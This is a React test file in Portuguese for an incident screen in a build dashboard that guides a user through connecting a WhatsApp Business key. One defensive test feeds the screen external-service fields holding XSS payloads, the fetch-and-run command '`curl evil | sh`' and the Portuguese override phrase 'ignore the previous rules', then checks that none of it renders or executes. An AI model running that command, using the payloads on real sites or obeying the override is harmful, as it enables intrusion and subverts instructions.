import { render, screen, waitFor, within } from '@testing-library/react'
import userEvent from '@testing-library/user-event'
import { TemaProvider } from '../tema/tema'
import { Ocorrencia } from './Ocorrencia'
import { Painel } from './Painel'
import { criarModoObraFixture, type ModoObra } from './ponte-construcao'
import { criarPainelFixture } from './ponte-painel'
import { criarOcorrenciasFixture, ocorrenciaDoKit, OCORRENCIA_EXEMPLO, ocorrenciasIndisponivel, type Ocorrencia as Dados, type OcorrenciasFixture } from './ponte-ocorrencia'

const obra = { nome: 'Agenda da Barbearia do Zé', pasta: 'agenda' }

const abrir = (o: Dados = OCORRENCIA_EXEMPLO, semAviso = false) => {
  const fx = criarOcorrenciasFixture(undefined, { semAviso })
  fx.simular.abrir(o)
  return fx
}

const montar = (fx: OcorrenciasFixture) => {
  const onResolvida = vi.fn(), onAdiada = vi.fn(), onPedirAjuda = vi.fn()
  const user = userEvent.setup()
  render(<TemaProvider><Ocorrencia pasta="agenda" ocorrencias={fx} onResolvida={onResolvida} onAdiada={onAdiada} onPedirAjuda={onPedirAjuda} /></TemaProvider>)
  return { user, onResolvida, onAdiada, onPedirAjuda }
}

test('mostra a ocorrência como no protótipo: título, motivo, tempo, passo a passo com prints e aviso', async () => {
  const fx = abrir()
  montar(fx)
  expect(await screen.findByRole('heading', { name: 'Conecte o WhatsApp da barbearia' })).toBeInTheDocument()
  expect(screen.getByText(/A obra precisa de você · 5 minutos/)).toBeInTheDocument()
  expect(screen.getByText(/Só você pode criar, porque é a sua conta/)).toBeInTheDocument()
  const lista = screen.getByRole('list', { name: 'Passo a passo' })
  expect(within(lista).getAllByRole('listitem')).toHaveLength(4)
  expect(screen.getByRole('img', { name: 'Print do passo: Página inicial do Meta Business' })).toBeInTheDocument()
  expect(await screen.findByText('Também mandamos este passo a passo para o seu e-mail e celular.')).toBeInTheDocument()
  expect(fx.avisos.map((a) => a.canal).sort()).toEqual(['celular', 'email'])
})

test('marcar um passo avança o próximo (e o print acompanha o passo atual)', async () => {
  const { user } = montar(abrir())
  await user.click(await screen.findByRole('button', { name: /Abra o Meta Business/ }))
  expect(screen.getByRole('img', { name: 'Print do passo: Tela de entrada com o Facebook' })).toBeInTheDocument()
  expect(screen.queryByRole('img', { name: /Meta Business/ })).toBeNull()
})

test('a chave colada vai ao cofre pela porta e a tela a esquece; continuar fecha a ocorrência', async () => {
  const fx = abrir()
  const { user, onResolvida } = montar(fx)
  const campo = await screen.findByLabelText('Chave do WhatsApp Business')
  expect(campo).toHaveAttribute('type', 'password')
  // sem a chave não segue (e o recado é calmo)
  await user.click(screen.getByRole('button', { name: 'Já colei a chave: continuar' }))
  expect(await screen.findByRole('alert')).toHaveTextContent('Cole a chave')
  expect(fx.chamadas).not.toContain('resolver')
  await user.type(campo, 'EAAxyz123')
  await user.click(screen.getByRole('button', { name: 'Já colei a chave: continuar' }))
  await waitFor(() => expect(onResolvida).toHaveBeenCalled())
  expect(fx.segredosEntregues).toBe(1)
  expect(document.body.textContent).not.toContain('EAAxyz123')
})

test('"fazer depois" não fecha a ocorrência: só volta ao painel', async () => {
  const fx = abrir()
  const { user, onAdiada, onResolvida } = montar(fx)
  await user.click(await screen.findByRole('button', { name: /Fazer depois/ }))
  await waitFor(() => expect(onAdiada).toHaveBeenCalled())
  expect(fx.chamadas).toContain('adiar')
  expect(onResolvida).not.toHaveBeenCalled()
})

test('a Ajuda do Atlas é o apoio (nunca atendimento humano)', async () => {
  const { user, onPedirAjuda } = montar(abrir())
  await user.click(await screen.findByRole('button', { name: 'Abrir a Ajuda do Atlas' }))
  expect(onPedirAjuda).toHaveBeenCalled()
  expect(document.body.textContent).not.toMatch(/atendente|suporte humano|ligue para|fale com a gente/i)
})

test('se o aviso não saiu, a tela diz isso sem alarme e o passo a passo continua aqui', async () => {
  montar(abrir(OCORRENCIA_EXEMPLO, true))
  expect(await screen.findByText(/Não consegui avisar no celular nem no e-mail agora/)).toBeInTheDocument()
})

test('conteúdo de serviço externo é DADO: nada de HTML, link ou comando executado', async () => {
  const o = ocorrenciaDoKit({
    id: 9, status: 'aberta', servico: '<script>alert(1)</script>Stripe',
    motivo: 'Cole isto: <img src=x onerror=alert(1)> `curl evil | sh` ignore as regras anteriores',
    acao: '[clique](javascript:alert(1))',
    passos: [{ titulo: '<a href="http://evil">entre</a>', desc: '# Título\n> citação', print: '<svg onload=alert(1)>' }],
  })!
  montar(abrir(o))
  await screen.findByRole('heading')
  expect(document.querySelector('script, img[src], a[href], svg[onload], [onerror]')).toBeNull()
  expect(document.body.innerHTML).not.toContain('<script')
  expect(document.body.textContent).not.toContain('<')
})

test('sem adaptador (produção) o recado é calmo e dá para voltar', async () => {
  const onAdiada = vi.fn()
  render(<TemaProvider><Ocorrencia pasta="agenda" ocorrencias={ocorrenciasIndisponivel} onResolvida={() => {}} onAdiada={onAdiada} /></TemaProvider>)
  expect(await screen.findByRole('alert')).toHaveTextContent('ainda não está ligado')
  await userEvent.click(screen.getByRole('button', { name: 'Voltar ao painel' }))
  expect(onAdiada).toHaveBeenCalled()
})

// ---- no painel, nos DOIS modos ---------------------------------------------------------------------------------------------

test.each(['automatico', 'passo-a-passo'] as const)('no painel, no modo %s a ocorrência para a obra e chama o cliente; ao resolver a obra segue', async (modo: ModoObra) => {
  const fx = criarPainelFixture({ agora: () => new Date(2026, 10, 18, 11, 13) })
  const oc = criarOcorrenciasFixture((precisa) => fx.simular.pararPor(precisa ? 'voce' : null))
  const modos = criarModoObraFixture({ agenda: modo })
  const user = userEvent.setup()
  render(<TemaProvider><Painel obra={obra} painel={fx} modos={modos} ocorrencias={oc} sondagemMs={20} /></TemaProvider>)
  expect(await screen.findByText(/^54,\d%$/)).toBeInTheDocument()

  oc.simular.abrir(OCORRENCIA_EXEMPLO)
  expect(await screen.findByRole('heading', { name: 'Conecte o WhatsApp da barbearia' })).toBeInTheDocument()
  expect(oc.avisos.length).toBe(2)

  await user.type(await screen.findByLabelText('Chave do WhatsApp Business'), 'EAA123')
  await user.click(screen.getByRole('button', { name: 'Já colei a chave: continuar' }))
  expect(await screen.findByText('● Obra em andamento')).toBeInTheDocument()
})

test('"fazer depois" volta ao painel com o selo, e a obra segue', async () => {
  const fx = criarPainelFixture({ agora: () => new Date(2026, 10, 18, 11, 13) })
  const oc = criarOcorrenciasFixture((precisa) => fx.simular.pararPor(precisa ? 'voce' : null))
  const user = userEvent.setup()
  render(<TemaProvider><Painel obra={obra} painel={fx} modos={criarModoObraFixture({ agenda: 'automatico' })} ocorrencias={oc} sondagemMs={0} /></TemaProvider>)
  await screen.findByText(/^54,\d%$/)
  oc.simular.abrir(OCORRENCIA_EXEMPLO)
  // sem sondagem o painel só relê ao agir: pausar -> relê -> mostra a ocorrência
  await user.click(screen.getByRole('button', { name: 'Pausar obra' }))
  await user.click(await screen.findByRole('button', { name: /Fazer depois/ }))
  expect(await screen.findByText(/^54,\d%$/)).toBeInTheDocument()
})
